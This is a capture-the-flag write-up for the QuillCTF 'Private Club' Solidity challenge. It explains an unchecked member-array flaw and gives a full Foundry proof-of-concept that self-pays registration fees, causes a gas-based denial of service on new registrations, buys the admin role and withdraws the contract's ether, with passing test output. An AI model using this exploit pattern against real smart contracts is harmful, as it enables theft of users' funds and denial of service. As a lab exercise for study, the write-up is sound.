# QuillCTF : Private Club

## Objective of CTF
```
Become a member of a private club.
Block future registrations.
Withdraw all Ether from the privateClub contract.
```

We have to become a member of the private block and block future registration by using up the gas, also we have to steal ether to buy admin role and finally withdraw all ether from the contract as admin

```solidity
    function becomeMember(
        address[] calldata _members
    ) external payable nonReentrant {
        require(block.timestamp < registerEndDate, "registration closed");
        require(_members.length == membersCount, "wrong members length");
        require(msg.value == membersCount * 1 ether, "need more ethers");
        for (uint i = 0; i < _members.length; i++) {
            _members[i].call{value: 1 ether}("");
        }
        membersCount += 1;
        members[msg.sender] = true;
        members_.push(msg.sender);
    }
```

To become a member, we have to pay 1 ether to all existing member, and the contract will send 1 ether to all existing member in a for loop

However it only checks that the array parameter's length equals to the membersCount, but it doesn't check that the members in the array parameter are actually members of the private club, so we can just set our own address as the array parameter and it will just sending the ether back to us, and we will not lose any ether becoming a member

So to do a DoS, we just need to repeat that many times, until the membersCount is large enough that the for loop will use up all gas, however in the foundry test, we don't actually need to use up the block gas limit (30000000)

```solidity
        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);
        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }
        uint etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();

        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();
```

It will just check if the gas used is greater than 120000, so we just need to become member for a few times that it will use more than 120000 gas

Also, when user4 is becoming member, it will send ether to us, as we became member for a few times

Finally, we can just buy the admin role with 10 ether and withdraw all ether from the contract


## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PrivateClub.sol";

contract Hack is Test {
    PrivateClub club;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint blockGasLimit = 120000;

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.startPrank(clubAdmin);
        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();
        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();
        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(hacker);
        // task1: become member of the club and
        // block future registrations (reason: out of gas - block gas limit)
        // solution:
        address[] memory arr = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            arr[i] = hacker;
        }
        club.becomeMember{value: arr.length * 1 ether}(arr);

        address[] memory arr1 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            arr1[i] = hacker;
        }
        club.becomeMember{value: arr1.length * 1 ether}(arr1);

        address[] memory arr2 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            arr2[i] = hacker;
        }
        club.becomeMember{value: arr2.length * 1 ether}(arr2);

        address[] memory arr3 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            arr3[i] = hacker;
        }
        club.becomeMember{value: arr3.length * 1 ether}(arr3);

        address[] memory arr4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            arr4[i] = hacker;
        }
        club.becomeMember{value: arr4.length * 1 ether}(arr4);
        
                       vm.stopPrank();
        // check - hacker is member
        assertTrue(club.members(hacker));


        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);
        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }
        uint etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();

        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();


        vm.startPrank(hacker);
        // task2: buy admin role and withdraw all ether from the club
        // solution:
        club.buyAdminRole{value: 10 ether}(hacker);
        club.adminWithdraw(hacker, address(club).balance);


        // check - hacker is owner of club
        assertEq(club.owner(), hacker);
        assertGt(hacker.balance, 110000000000000000000 - 1);
    }
}
```

### Foundry test output

```
# forge test --match-path test/PrivateClub.t.sol -vv
[⠊] Compiling...
No files changed, compilation skipped

Running 1 test for test/PrivateClub.t.sol:Hack
[PASS] test_attack() (gas: 608601)
Test result: ok. 1 passed; 0 failed; finished in 3.82ms
```